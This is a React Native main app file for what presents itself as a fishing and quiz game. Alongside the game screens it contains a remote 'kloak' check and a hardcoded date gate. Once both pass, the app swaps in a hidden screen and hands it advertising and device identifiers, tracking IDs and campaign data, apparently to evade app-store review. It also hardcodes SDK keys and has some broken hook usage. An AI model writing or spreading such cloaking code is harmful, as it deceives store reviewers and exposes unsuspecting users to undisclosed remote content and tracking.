import {createNativeStackNavigator} from '@react-navigation/native-stack';
import {NavigationContainer} from '@react-navigation/native';
import {
  CustomFlashScreen,
  GameScreen,
  GreatingScreen,
  MainScreen,
  PlayQuizScreen,
  PlayScreen,
  RulesScreen,
  UserScreen,
  ScreenRoute,
} from './screen';
import {AquaProvider} from './store/aqua_context';
import {useEffect, useCallback, useRef, useState, useMemo} from 'react';
import {LogLevel, OneSignal} from 'react-native-onesignal';
import AsyncStorage from '@react-native-async-storage/async-storage';
import appsFlyer from 'react-native-appsflyer';
import DeviceInfo from 'react-native-device-info';
import {handleGetAaid} from './config/getAaid';

// One Signal app id a2f6b718-f86a-44b9-b6fd-954f8ad18151

const Stack = createNativeStackNavigator();

const option = {
  devKey: 'ZP6F7NaeyNmgAdC29AdB4T',
  appId: 'big.game.bass.bonanza',
  onInstallConversionDataListener: true,
  onDeepLinkListener: true,
  timeToWaitForATTUserAuthorization: 10,
  manualStart: true,
};

const generateTimestampUserId = () => {
  return `${new Date().getTime()}-${Math.floor(
    1000000 + Math.random() * 9000000,
  )}`;
};

const INITIAL_URL = `https://brilliant-grand-happiness.space/`;
const URL_IDENTIFAIRE = `fZ51zZcs`;
const targetData = new Date('2025-03-20T10:00:00Z');
const currentDate = new Date();

function App() {
  // screen rendering
  const [isWelcomeComplete, setIsWelcomeComplete] = useState(false);
  // OneSignal
  const [oneSignalUserId, setOneSignalUserId] = useState(null);
  const [isOneSignalReady, setIsOneSignalReady] = useState(false);
  const [oneSignalPermissionStatus, setOneSignalPermissionStatus] =
    useState(false);
  // First Visit check
  const [timeStamp, setTimeStamp] = useState(null);
  const [isFirstVisit, setIsFirstVisit] = useState(null);
  // isReadyToVisitHandler
  const [isReadyToVisit, setIsReadyToVisit] = useState(false);
  const hasCheckedUrl = useRef(false);
  const urlCheckTimeout = useRef(null);
  const [isLoadingParams, setIsLoadingParams] = useState(false);
  // AppsFlyer
  const [idfv, setIdfv] = useState(null);
  const [aaid, setAaid] = useState(null);
  const [applsFlyerUID, setApplsFlyerUID] = useState(null);
  const [isNonOrganicInstall, setIsNonOrganicInstall] = useState(false);
  const [isConversionDataReceived, setIsConversionDataReceived] =
    useState(false);
  const [sabData, setSabData] = useState(null);
  // Push notifications
  const [openWithPush, setOpenWithPush] = useState(false);

  useEffect(() => {
    // console.log('OneSignal in  useEffect');
    const initOneSignal = async () => {
      // console.log('initOneSignal');
      // Remove this method to stop OneSignal Debugging
      OneSignal.Debug.setLogLevel(LogLevel.Verbose);
      // OneSignal Initialization
      OneSignal.initialize('a2f6b718-f86a-44b9-b6fd-954f8ad18151');

      try {
        // Request permission and get user ID
        const permissionResult =
          await OneSignal.Notifications.requestPermission(true);
        setOneSignalPermissionStatus(permissionResult);
        console.log('OneSignal permission result:', permissionResult);

        // if (permissionResult) {
        const userId = await OneSignal.User.getOnesignalId();
        console.log('OneSignal: user id:', userId);

        if (userId) {
          setOneSignalUserId(userId);
          await AsyncStorage.setItem('oneSignalUserId', userId);
          // console.log(userId);
          setIsOneSignalReady(true);
        } else {
          // If no userId, set up a listener for when it becomes available
          const userStateChangedListener = OneSignal.User.addEventListener(
            'change',
            async event => {
              const newUserId = await OneSignal.User.getOnesignalId();
              if (newUserId) {
                // console.log('OneSignal: got delayed user id:', newUserId);
                setOneSignalUserId(newUserId);
                await AsyncStorage.setItem('oneSignalUserId', newUserId);
                setIsOneSignalReady(true);
                userStateChangedListener.remove();
              }
            },
          );
        }
        // }
      } catch (error) {
        console.error('Error initializing OneSignal:', error);
        // Fallback: try to get stored userId
        const storedUserId = await AsyncStorage.getItem('oneSignalUserId');
        if (storedUserId) {
          setOneSignalUserId(storedUserId);
          setIsOneSignalReady(true);
        }
      }
    };

    initOneSignal();
  }, []);

  const checkFirstVisit = async () => {
    try {
      const hasVisited = await AsyncStorage.getItem('hasVisitedBefore');
      // console.log('hasVisited', hasVisited);

      // Get stored timestamp_user_id first
      let storedTimeStamp = await AsyncStorage.getItem('timeStamp');
      if (!storedTimeStamp) {
        // Generate new timestamp_user_id only if none exists
        storedTimeStamp = generateTimestampUserId();
        await AsyncStorage.setItem('timeStamp', storedTimeStamp);
        // console.log('Generated new timestamp_user_id:', storedTimeStamp);
      } else {
        // console.log('Retrieved stored timestamp_user_id:', storedTimeStamp);
      }

      // Set timestamp for use in app
      setTimeStamp(storedTimeStamp);

      if (!hasVisited) {
        // console.log('First visit');
        setIsFirstVisit(true);

        OneSignal.User.addTag('timestamp_user_id', storedTimeStamp);

        await new Promise(resolve => setTimeout(resolve, 500));

        await AsyncStorage.setItem('hasVisitedBefore', 'true');
      } else {
        // Returning user

        setIsFirstVisit(false);
        // setTimeStamp(parsedTimeStamp);
      }
    } catch (error) {
      console.error('Error checking first visit:', error);
    }
  };

  const isReadyToVisitHandler = async () => {
    if (hasCheckedUrl.current) {
      // console.log('URL check already performed');
      return;
    }

    // Clear any existing timeout
    if (urlCheckTimeout.current) {
      clearTimeout(urlCheckTimeout.current);
    }

    // Set a flag to prevent immediate re-runs
    hasCheckedUrl.current = true;

    try {
      const kloakSuccess = await AsyncStorage.getItem('kloakSuccess');
      const hasVisited = await AsyncStorage.getItem('hasVisitedBefore');
      const visitUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
      console.log('hasVisited', hasVisited);
      console.log('kloakSuccess', kloakSuccess);

      // Case 1: App was visited before and had successful kloak check
      // if (hasVisited && kloakSuccess) {
      //   console.log('App visited before and kloakSuccess 200');
      //   setIsReadyToVisit(true);
      //   return;
      // }

      if (hasVisited && kloakSuccess) {
        if (currentDate >= targetData) {
          console.log('currentDate >= targetData');
          setIsReadyToVisit(true);
        } else {
          console.log('currentDate < targetData');
          setIsReadyToVisit(false);
        }
        return;
      }

      // Case 2: Only fetch URL if not visited before
      if (!hasVisited) {
        console.log('First visit - checking URL');

        // Add timeout to ensure only one fetch happens
        urlCheckTimeout.current = setTimeout(async () => {
          try {
            const response = await fetch(visitUrl);
            console.log('URL status:', response.status);

            if (response.status === 200) {
              await AsyncStorage.setItem('kloakSuccess', 'true');

              if (currentDate >= targetData) {
                setIsReadyToVisit(true);
                console.log('Current date passed target date, ready to visit');
              } else {
                setIsReadyToVisit(false);
                console.log('Current date has not passed target date');
              }
            } else {
              setIsReadyToVisit(false);
            }
          } catch (error) {
            console.log('URL fetch error:', error);
            setIsReadyToVisit(false);
          }
        }, 500); // Add small delay to prevent double calls
      }
    } catch (error) {
      console.log('Error in isReadyToVisitHandler:', error);
      setIsReadyToVisit(false);
    }

    // Cleanup timeout on unmount
    useEffect(() => {
      return () => {
        if (urlCheckTimeout.current) {
          clearTimeout(urlCheckTimeout.current);
        }
      };
    }, []);
  };

  const initAppsFlyer = async () => {
    try {
      // Set up conversion data listener first
      appsFlyer.onInstallConversionData(async res => {
        console.log('AppsFlyer Conversion Data received:', res);

        // try {
        if (JSON.parse(res.data.is_first_launch) === true) {
          console.log('Is app first launch-', res);

          if (res.data.af_status === 'Non-organic') {
            const media_source = res.data.media_source;
            const campaign = res.data.campaign;
            const af_siteid = res.data.af_siteid ?? '';
            const af_ad = res.data.af_ad || '';
            const af_channel = res.data.af_channel || '';

            try {
              await AsyncStorage.setItem('sabData', campaign);
              await AsyncStorage.setItem('media_source', media_source);
              await AsyncStorage.setItem('af_siteid', af_siteid);
              await AsyncStorage.setItem('af_ad', af_ad);
              await AsyncStorage.setItem('af_channel', af_channel);
              setSabData(campaign);
              await AsyncStorage.setItem('isNonOrganicInstall', 'true');
              setIsNonOrganicInstall(true);
            } catch (error) {
              console.error('Error saving non-organic data:', error);
            }
          } else if (res.data.af_status === 'Organic') {
            console.log('Organic install detected');
            const organicTestData = '';
            const media_source = '';
            const af_siteid = '';
            const af_ad = '';
            const af_channel = '';
            try {
              await AsyncStorage.setItem('sabData', organicTestData);
              setSabData(organicTestData);
              await AsyncStorage.setItem('isNonOrganicInstall', 'false');
              setIsNonOrganicInstall(false);
              await AsyncStorage.setItem('media_source', media_source);
              await AsyncStorage.setItem('af_siteid', af_siteid);
              await AsyncStorage.setItem('af_ad', af_ad);
              await AsyncStorage.setItem('af_channel', af_channel);
            } catch (error) {
              console.error('Error saving organic data:', error);
            }
          }
        } else {
          console.log('Not first app launch');
          try {
            const storedSabData = await AsyncStorage.getItem('sabData');
            const storedIsNonOrganic = await AsyncStorage.getItem(
              'isNonOrganicInstall',
            );

            if (storedSabData) {
              setSabData(storedSabData);
            }
            setIsNonOrganicInstall(storedIsNonOrganic === 'true');
          } catch (error) {
            console.error('Error retrieving stored data:', error);
          }
        }
        // }
        // catch (err) {
        //   console.error('Error processing AppsFlyer data:', err);
        // }

        setIsConversionDataReceived(true);
      });

      // Get AAID
      const aaid = await handleGetAaid();
      setAaid(aaid);

      // Get device unique ID
      try {
        const deviceId = await DeviceInfo.getUniqueId();
        setIdfv(deviceId);

        // Initialize AppsFlyer SDK
        appsFlyer.initSdk(
          option,
          res => {
            console.log('AppsFlyer SDK initialized successfully:', res);

            // Set customer user ID
            appsFlyer.setCustomerUserId(deviceId);

            // Get AppsFlyer UID
            appsFlyer.getAppsFlyerUID((err, appsFlyerUID) => {
              if (err) {
                console.error(err);
              } else {
                setApplsFlyerUID(appsFlyerUID);
              }
            });
          },
          error => {
            console.error('AppsFlyer SDK failed to start:', error);
            // Set defaults to allow app to continue
            setIsConversionDataReceived(true);
          },
        );

        appsFlyer.startSdk();
      } catch (error) {
        console.error('Error in device info:', error);
        // Set defaults to allow app to continue
        setIdfv('unknown-device');
        setIsConversionDataReceived(true);
      }
    } catch (error) {
      console.error('Error in initAppsFlyer:', error);
      // Set these to true so the app can continue even if AppsFlyer fails
      setIsConversionDataReceived(true);
    }
  };

  useEffect(() => {
    checkFirstVisit();
    isReadyToVisitHandler();
    initAppsFlyer();

    // If it's not first visit, mark conversion data as already received
    if (!isFirstVisit) {
      setIsConversionDataReceived(true);
    }
  }, [isFirstVisit]);

  const handleNotificationClick = useCallback(async event => {
    // console.log('🔔 Handling notification click:', event);
    const timeStamp = await AsyncStorage.getItem('timeStamp');
    const baseUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
    let finalUrl;

    try {
      // Check if this is first visit
      const hasVisited = await AsyncStorage.getItem('hasVisitedBefore');

      if (event.notification.launchURL) {
        console.log('Regular push_open_browser case');
        finalUrl = `${baseUrl}?utretg=push_open_browser&jthrhg=${timeStamp}`;
        await fetch(finalUrl);
        await Linking.openURL(finalUrl);
        await AsyncStorage.setItem('openedWithPush', JSON.stringify(true));
        setOpenWithPush(true);
      } else {
        console.log('Regular push_open_webview case');
        finalUrl = `${baseUrl}?utretg=push_open_webview&jthrhg=${timeStamp}`;
        setOpenWithPush(true);
        // Set push state in AsyncStorage
        await AsyncStorage.setItem('openedWithPush', JSON.stringify(true));
        console.log('Set openedWithPush in AsyncStorage');
        if (!hasVisited) {
          await AsyncStorage.setItem('hasVisitedBefore', 'true');
          console.log('Marked as visited for the first time');
        }

        // Update states
        setOpenWithPush(true);
        console.log('Set openWithPush state to true');

        // Make the fetch request
        await fetch(finalUrl);

        // Ensure ready to visit
        // setIsReadyToVisit(true);
      }
    } catch (error) {
      console.error('🔔 Error handling notification:', error);
    }
  }, []);

  useEffect(() => {
    const setupNotifications = async () => {
      try {
        // Add notification click listener with the handler
        const clickListener = OneSignal.Notifications.addEventListener(
          'click',
          event => {
            // console.log('🔔 Notification clicked:', event);
            handleNotificationClick(event);
          },
        );
        // ... rest of your notification setup ...

        return () => {
          clickListener.remove();
          // ... other cleanup ...
        };
      } catch (error) {
        console.error('🔔 Error setting up notifications:', error);
      }
    };

    setupNotifications();
  }, []);

  const isReadyForTestScreen = useMemo(() => {
    console.log('Ready check:', {
      isReadyToVisit,
      aaid,
      applsFlyerUID,
      idfv,
      timeStamp,
      isConversionDataReceived,
      oneSignalUserId,
      isOneSignalReady,
    });

    // Basic requirements for all launches
    const baseRequirements =
      isReadyToVisit &&
      aaid &&
      applsFlyerUID &&
      idfv &&
      timeStamp &&
      isConversionDataReceived &&
      isOneSignalReady &&
      oneSignalUserId &&
      isWelcomeComplete;

    // For first launch, also require sabData
    if (isFirstVisit) {
      return baseRequirements;
    }

    // For subsequent launches, only need base requirements
    return baseRequirements;
  }, [
    isReadyToVisit,
    aaid,
    applsFlyerUID,
    idfv,
    timeStamp,
    isConversionDataReceived,
    isOneSignalReady,
    oneSignalUserId,
    isFirstVisit,
    openWithPush,
    isWelcomeComplete,
  ]);

  const handleWelcomeComplete = useCallback(() => {
    setIsWelcomeComplete(true);
  }, []);

  return (
    <AquaProvider>
      <NavigationContainer>
        <Stack.Navigator screenOptions={{headerShown: false}}>
          {!isWelcomeComplete ? (
            <Stack.Screen name="CustomSplash">
              {props => (
                <CustomFlashScreen
                  {...props}
                  onWelcomeComplete={handleWelcomeComplete}
                />
              )}
            </Stack.Screen>
          ) : isReadyForTestScreen ? (
            <>
              <Stack.Screen
                name="ScreenRoute"
                component={ScreenRoute}
                initialParams={{
                  idfa: aaid,
                  oneSignalUserId,
                  idfv,
                  applsFlyerUID,
                  jthrhg: timeStamp,
                  isFirstVisit,
                  timeStamp,
                  oneSignalPermissionStatus,
                  isNonOrganicInstall,
                  openWithPush,
                  ...(isFirstVisit && {sabData}),
                }}
              />
            </>
          ) : (
            <>
              <Stack.Screen name="GreatingsScreen" component={GreatingScreen} />
              <Stack.Screen name="MainScreen" component={MainScreen} />
              <Stack.Screen name="GameScreen" component={GameScreen} />
              <Stack.Screen name="PlayScreen" component={PlayScreen} />
              <Stack.Screen name="PlayQuizScreen" component={PlayQuizScreen} />
              <Stack.Screen name="UserScreen" component={UserScreen} />
              <Stack.Screen name="RulesScreen" component={RulesScreen} />
            </>
          )}
        </Stack.Navigator>
      </NavigationContainer>
    </AquaProvider>
  );
}

export default App;
